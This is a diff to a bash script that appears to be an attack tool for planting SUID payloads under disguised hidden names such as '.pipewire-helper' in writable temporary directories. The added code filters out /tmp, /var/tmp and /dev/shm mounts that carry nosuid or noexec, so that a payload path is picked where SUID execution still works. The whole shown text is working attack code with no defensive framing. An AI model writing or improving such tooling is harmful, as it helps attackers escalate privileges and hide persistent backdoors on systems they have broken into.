@@ -19,7 +19,43 @@ NAMES=(
   ".pipewire-helper"
 )
 
-dest_dir="${DEST_DIRS[$RANDOM % ${#DEST_DIRS[@]}]}"
+is_suid_exec_capable_mount() {
+  local dir="$1"
+  local opts
+
+  if ! command -v findmnt > /dev/null 2>&1; then
+    return 0
+  fi
+
+  opts="$(findmnt -T "$dir" -no OPTIONS 2>/dev/null || true)"
+  if [ -z "$opts" ]; then
+    return 0
+  fi
+
+  case ",$opts," in
+    *,nosuid,*|*,noexec,*)
+      return 1
+      ;;
+  esac
+
+  return 0
+}
+
+SUPPORTED_DEST_DIRS=()
+for dir in "${DEST_DIRS[@]}"; do
+  if is_suid_exec_capable_mount "$dir"; then
+    SUPPORTED_DEST_DIRS+=("$dir")
+  else
+    echo "[!] Skipping $dir for SUID payload (mount has nosuid/noexec)"
+  fi
+done
+
+if [ "${#SUPPORTED_DEST_DIRS[@]}" -eq 0 ]; then
+  echo "[-] No writable destination supports SUID execution (/tmp, /var/tmp, /dev/shm all filtered)."
+  exit 1
+fi
+
+dest_dir="${SUPPORTED_DEST_DIRS[$RANDOM % ${#SUPPORTED_DEST_DIRS[@]}]}"
 payload_src="${PAYLOADS[$RANDOM % ${#PAYLOADS[@]}]}"
 payload_name="${NAMES[$RANDOM % ${#NAMES[@]}]}"
 payload_path="${dest_dir}/${payload_name}"
